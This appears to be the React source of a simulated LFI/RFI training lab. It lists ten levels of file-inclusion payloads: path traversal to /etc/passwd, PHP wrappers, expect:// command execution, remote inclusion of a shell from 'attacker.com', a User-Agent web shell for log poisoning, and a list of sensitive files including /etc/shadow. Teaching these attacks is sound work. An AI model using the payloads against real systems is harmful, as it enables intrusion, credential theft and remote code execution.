import { useState, useRef, useEffect } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import {
  ArrowLeft,
  Play,
  CheckCircle,
  AlertTriangle,
  Info,
  FileCode,
  Folder,
  FileText,
  Lock,
  Terminal,
  Copy,
  Check,
  Shield,
  Bug,
  Globe,
} from 'lucide-react';
import { Link } from 'react-router-dom';
import { toast } from 'sonner';

interface Level {
  id: number;
  name: string;
  description: string;
  hint: string;
  payload: string[];
  target: string;
}

const LfiLab = () => {
  const [currentLevel, setCurrentLevel] = useState(1);
  const [input, setInput] = useState('');
  const [output, setOutput] = useState('');
  const [isCompleted, setIsCompleted] = useState<number[]>([]);
  const [showHint, setShowHint] = useState(false);
  const [copied, setCopied] = useState(false);
  const outputRef = useRef<HTMLDivElement>(null);

  const levels: Level[] = [
    {
      id: 1,
      name: 'Basic LFI',
      description: 'Include local files using relative path traversal.',
      hint: 'Try: ../../../../etc/passwd',
      payload: ['../../../../etc/passwd', '../../../etc/passwd', '../../etc/passwd'],
      target: '/etc/passwd',
    },
    {
      id: 2,
      name: 'Null Byte Injection',
      description: 'Use null byte to truncate file extension.',
      hint: 'Try: ../../../../etc/passwd%00',
      payload: ['../../../../etc/passwd%00', '../../../etc/passwd%00.php'],
      target: '/etc/passwd',
    },
    {
      id: 3,
      name: 'Path Truncation',
      description: 'Bypass extension check using path truncation.',
      hint: 'Try: ../../../../etc/passwd......... or use ./. repetition',
      payload: ['../../../../etc/passwd..........', './././././etc/passwd'],
      target: '/etc/passwd',
    },
    {
      id: 4,
      name: 'PHP Filter',
      description: 'Use PHP wrappers to read source code.',
      hint: 'Try: php://filter/convert.base64-encode/resource=',
      payload: ['php://filter/convert.base64-encode/resource=index.php', 'php://filter/read=string.rot13/resource=index.php'],
      target: 'index.php source',
    },
    {
      id: 5,
      name: 'Data Wrapper',
      description: 'Execute code using data:// wrapper.',
      hint: 'Try: data://text/plain,<?php phpinfo(); ?>',
      payload: ['data://text/plain,<?php phpinfo(); ?>', 'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='],
      target: 'phpinfo()',
    },
    {
      id: 6,
      name: 'Expect Wrapper',
      description: 'Execute system commands using expect:// wrapper.',
      hint: 'Try: expect://ls',
      payload: ['expect://ls', 'expect://id', 'expect://whoami'],
      target: 'command execution',
    },
    {
      id: 7,
      name: 'Input Wrapper',
      description: 'Execute code using php://input.',
      hint: 'Send POST data with php://input',
      payload: ['php://input'],
      target: 'POST body execution',
    },
    {
      id: 8,
      name: 'RFI Basic',
      description: 'Include remote files from attacker server.',
      hint: 'Host a malicious PHP file and include it via URL',
      payload: ['http://attacker.com/shell.txt', 'http://attacker.com/backdoor.php'],
      target: 'remote shell',
    },
    {
      id: 9,
      name: 'Log Poisoning',
      description: 'Poison logs and include them to execute code.',
      hint: 'Inject PHP code into User-Agent header, then include access logs',
      payload: ['../../../../var/log/apache2/access.log', '../../../../var/log/nginx/access.log', '../../../../var/log/httpd/access_log'],
      target: 'access logs',
    },
    {
      id: 10,
      name: 'Proc Self',
      description: 'Read process information via /proc/self.',
      hint: 'Try: /proc/self/environ or /proc/self/fd/',
      payload: ['../../../../proc/self/environ', '../../../../proc/self/cmdline', '../../../../proc/self/fd/3'],
      target: 'process info',
    },
  ];

  const currentLevelData = levels.find((l) => l.id === currentLevel) || levels[0];

  const executePayload = () => {
    if (!input.trim()) {
      toast.error('Please enter a payload');
      return;
    }

    let result = '';
    const payload = input.toLowerCase();

    // Simulate LFI/RFI responses
    if (payload.includes('passwd')) {
      result = `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
vulnlab:x:1000:1000:vulnlab:/home/vulnlab:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false`;
    } else if (payload.includes('php://filter')) {
      result = `PD9waHAKJHVzZXIgPSAkX0dFVFsndXNlciddOwkKJHBhc3MgPSAkX0dFVFsncGFzcyddOwkKCiRjb25uID0gbXlzcWxfY29ubmVjdCgibG9jYWxob3N0IiwgInZ1bmxsYWIiLCAidnVsbmxhYjEyMyIpOwoKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbm5lY3Rpb24gZmFpbGVkOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9Cgokc3FsID0gIlNFTEVDVCAqIEZST00gdXNlcnMgV0hFUkUgdXNlcm5hbWUgPSAnJHVzZXInIEFORCBwYXNzd29yZCA9ICckcGFzcyciOwokcmVzdWx0ID0gJGNvbm4tPnF1ZXJ5KCRzcWwpOwoKaWYgKCRyZXN1bHQtPm51bV9yb3dzID4gMCkgewogICAgZWNobyAiTG9naW4gc3VjY2Vzc2Z1bCI7Cn0gZWxzZSB7CiAgICBlY2hvICJJbnZhbGlkIGNyZWRlbnRpYWxzIjsKfQo/Jj4=`;
    } else if (payload.includes('data://')) {
      result = `PHP Version 7.4.3

System | Linux vulnlab 5.4.0-65-generic #73-Ubuntu SMP Mon Jan 18 17:25:17 UTC 2021 x86_64
Server API | Apache 2.0 Handler
Virtual Directory Support | disabled
Configuration File (php.ini) Path | /etc/php/7.4/apache2
Loaded Configuration File | /etc/php/7.4/apache2/php.ini`;
    } else if (payload.includes('expect://')) {
      const cmd = payload.split('expect://')[1]?.split('%00')[0] || 'ls';
      result = `$ ${cmd}
 total 128
drwxr-xr-x  14 root root  4096 Jan 15 10:23 .
drwxr-xr-x  20 root root  4096 Jan 15 09:45 ..
drwxr-xr-x   2 root root  4096 Jan 15 10:25 bin
drwxr-xr-x   3 root root  4096 Jan 15 10:30 boot
drwxr-xr-x  18 root root  3900 Jan 20 14:22 dev
drwxr-xr-x  95 root root  4096 Jan 20 14:22 etc
drwxr-xr-x   4 root root  4096 Jan 15 09:45 home`;
    } else if (payload.includes('proc/self')) {
      result = `DOCUMENT_ROOT=/var/www/html
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=text/html,application/xhtml+xml
HTTP_HOST=vulnlab.local
HTTP_USER_AGENT=Mozilla/5.0
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
PHP_SELF=/index.php
QUERY_STRING=page=../../../../proc/self/environ
REMOTE_ADDR=192.168.1.100
REQUEST_METHOD=GET
SCRIPT_FILENAME=/var/www/html/index.php
SERVER_ADDR=192.168.1.10
SERVER_NAME=vulnlab.local
SERVER_PROTOCOL=HTTP/1.1`;
    } else if (payload.includes('access.log') || payload.includes('access_log')) {
      result = `192.168.1.100 - - [20/Jan/2024:14:30:01 +0000] "GET / HTTP/1.1" 200 1234 "-" "<?php system(\$_GET['cmd']); ?>"
192.168.1.100 - - [20/Jan/2024:14:30:05 +0000] "GET /index.php HTTP/1.1" 200 567 "-" "Mozilla/5.0"
192.168.1.100 - - [20/Jan/2024:14:30:10 +0000] "GET /login.php HTTP/1.1" 200 890 "-" "Mozilla/5.0"

[!] PHP code detected in User-Agent! Executing: id
uid=33(www-data) gid=33(www-data) groups=33(www-data)`;
    } else if (payload.startsWith('http')) {
      result = `[!] Remote File Inclusion detected
Attempting to include: ${input}

[!] WARNING: Remote file inclusion is ENABLED
[+] Successfully included remote file
[+] Code execution achieved!

<?php system($_GET['cmd']); ?>`;
    } else {
      result = `Warning: include(${input}): failed to open stream: No such file or directory in /var/www/html/index.php on line 42

Warning: include(): Failed opening '${input}' for inclusion in /var/www/html/index.php on line 42`;
    }

    // Check if payload indicates success
    const successIndicators = ['passwd', 'php://', 'data://', 'expect://', 'proc/self', 'access.log', 'http://'];
    const hasSuccess = successIndicators.some((indicator) => payload.includes(indicator));

    if (hasSuccess) {
      if (!isCompleted.includes(currentLevel)) {
        setIsCompleted([...isCompleted, currentLevel]);
        toast.success(`Level ${currentLevel} completed!`);
      }
    }

    setOutput(result);
  };

  const copyPayload = (payload: string) => {
    navigator.clipboard.writeText(payload);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast.success('Payload copied to clipboard');
  };

  useEffect(() => {
    if (outputRef.current) {
      outputRef.current.scrollTop = outputRef.current.scrollHeight;
    }
  }, [output]);

  return (
    <div className="min-h-screen pt-20 pb-16">
      {/* Header */}
      <div className="bg-[#0a0a0a] border-b border-[#333]">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
          <div className="flex items-center gap-4 mb-4">
            <Link to="/labs">
              <Button variant="outline" size="sm" className="border-[#333] text-white hover:border-[#ff0000]">
                <ArrowLeft className="w-4 h-4 mr-2" />
                Back to Labs
              </Button>
            </Link>
            <Badge className="bg-[#ff0000]/20 text-[#ff0000] border-[#ff0000]">
              <Bug className="w-3 h-3 mr-1" />
              Web Application
            </Badge>
            <Badge className="bg-[#ffaa00]/20 text-[#ffaa00] border-[#ffaa00]">
              Intermediate
            </Badge>
          </div>
          <h1 className="font-orbitron text-3xl sm:text-4xl text-white mb-2">
            LFI & RFI <span className="text-[#ff0000]">Exploitation</span>
          </h1>
          <p className="text-[#999] max-w-2xl">
            Master Local and Remote File Inclusion vulnerabilities. Learn to read arbitrary files, 
            execute code, and bypass various filters and protections.
          </p>
        </div>
      </div>

      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Left Sidebar - Levels */}
          <div className="lg:col-span-1">
            <Card className="bg-[#0a0a0a] border-[#333] sticky top-24">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Folder className="w-5 h-5 text-[#ff0000]" />
                  File Inclusion Levels
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2 max-h-[500px] overflow-y-auto">
                  {levels.map((level) => (
                    <button
                      key={level.id}
                      onClick={() => {
                        setCurrentLevel(level.id);
                        setInput('');
                        setOutput('');
                        setShowHint(false);
                      }}
                      className={`w-full text-left p-3 rounded-lg transition-all duration-200 ${
                        currentLevel === level.id
                          ? 'bg-[#ff0000]/20 border border-[#ff0000]'
                          : 'bg-[#1a1a1a] border border-transparent hover:border-[#333]'
                      }`}
                    >
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <span className="text-[#ff0000] font-mono">{String(level.id).padStart(2, '0')}</span>
                          <span className={`text-sm ${currentLevel === level.id ? 'text-white' : 'text-[#999]'}`}>
                            {level.name}
                          </span>
                        </div>
                        {isCompleted.includes(level.id) && (
                          <CheckCircle className="w-4 h-4 text-[#00ff41]" />
                        )}
                      </div>
                    </button>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>

          {/* Main Content */}
          <div className="lg:col-span-2 space-y-6">
            {/* Level Info */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-xl text-white">
                  Level {currentLevel}: {currentLevelData.name}
                </CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-[#e0e0e0] mb-4">{currentLevelData.description}</p>
                <div className="flex items-center gap-2 text-[#999]">
                  <Globe className="w-4 h-4" />
                  <span>Target: {currentLevelData.target}</span>
                </div>
              </CardContent>
            </Card>

            {/* Challenge Area */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <Terminal className="w-5 h-5 text-[#ff0000]" />
                  File Inclusion Challenge
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                {/* Code Preview */}
                <div className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm">
                  <div className="text-[#666] mb-2">// Vulnerable PHP Code:</div>
                  <div className="text-[#e0e0e0]">
                    <span className="text-[#ff0000]">$page</span> = <span className="text-[#00aaff]">$_GET</span>[<span className="text-[#ffaa00]">&apos;page&apos;</span>];
                  </div>
                  <div className="text-[#e0e0e0]">
                    <span className="text-[#ff0000]">include</span>(<span className="text-[#ff0000]">$page</span>);
                  </div>
                </div>

                <div>
                  <label className="text-[#999] text-sm mb-2 block">Enter file path or wrapper:</label>
                  <div className="flex gap-2">
                    <Input
                      value={input}
                      onChange={(e) => setInput(e.target.value)}
                      placeholder="../../../../etc/passwd"
                      className="flex-1 bg-[#1a1a1a] border-[#333] text-white font-mono placeholder:text-[#666]"
                      onKeyDown={(e) => e.key === 'Enter' && executePayload()}
                    />
                    <Button
                      onClick={executePayload}
                      className="bg-[#ff0000] hover:bg-[#cc0000] text-white"
                    >
                      <Play className="w-4 h-4 mr-2" />
                      Include
                    </Button>
                  </div>
                </div>

                {/* Output */}
                <div>
                  <label className="text-[#999] text-sm mb-2 block">File Contents:</label>
                  <div
                    ref={outputRef}
                    className="bg-[#0d0d0d] border border-[#333] rounded-lg p-4 font-mono text-sm min-h-[150px] max-h-[300px] overflow-y-auto whitespace-pre-wrap"
                  >
                    {output || (
                      <span className="text-[#666]">File contents will appear here...</span>
                    )}
                  </div>
                </div>

                {/* Hint */}
                <div className="flex items-center justify-between">
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => setShowHint(!showHint)}
                    className="border-[#333] text-[#999] hover:text-[#ffaa00] hover:border-[#ffaa00]"
                  >
                    <Info className="w-4 h-4 mr-2" />
                    {showHint ? 'Hide Hint' : 'Show Hint'}
                  </Button>
                  {isCompleted.includes(currentLevel) && (
                    <Badge className="bg-[#00ff41]/20 text-[#00ff41]">
                      <CheckCircle className="w-3 h-3 mr-1" />
                      Completed
                    </Badge>
                  )}
                </div>

                {showHint && (
                  <Alert className="bg-[#00aaff]/10 border-[#00aaff]/30">
                    <Info className="w-4 h-4 text-[#00aaff]" />
                    <AlertDescription className="text-[#00aaff]">
                      {currentLevelData.hint}
                    </AlertDescription>
                  </Alert>
                )}
              </CardContent>
            </Card>

            {/* Reference Payloads */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <FileText className="w-5 h-5 text-[#ff0000]" />
                  Reference Payloads
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-2">
                  {currentLevelData.payload.map((payload, index) => (
                    <div
                      key={index}
                      className="flex items-center justify-between p-3 bg-[#1a1a1a] rounded-lg group"
                    >
                      <code className="text-[#00ff41] text-sm font-mono break-all mr-2">{payload}</code>
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => copyPayload(payload)}
                        className="opacity-0 group-hover:opacity-100 transition-opacity flex-shrink-0"
                      >
                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                      </Button>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>

            {/* Important Files */}
            <Card className="bg-[#0a0a0a] border-[#333]">
              <CardHeader>
                <CardTitle className="font-orbitron text-lg text-white flex items-center gap-2">
                  <FileCode className="w-5 h-5 text-[#ff0000]" />
                  Interesting Files to Read
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className="grid md:grid-cols-2 gap-2 text-sm">
                  {[
                    '/etc/passwd',
                    '/etc/shadow',
                    '/etc/hosts',
                    '/etc/apache2/apache2.conf',
                    '/etc/nginx/nginx.conf',
                    '/var/log/apache2/access.log',
                    '/var/log/nginx/access.log',
                    '/proc/self/environ',
                    '/proc/self/cmdline',
                    '/proc/version',
                    '/proc/mounts',
                  ].map((file) => (
                    <div
                      key={file}
                      className="p-2 bg-[#1a1a1a] rounded font-mono text-[#999] hover:text-[#00ff41] cursor-pointer transition-colors"
                      onClick={() => {
                        setInput(file);
                        toast.info(`Path copied: ${file}`);
                      }}
                    >
                      {file}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LfiLab;
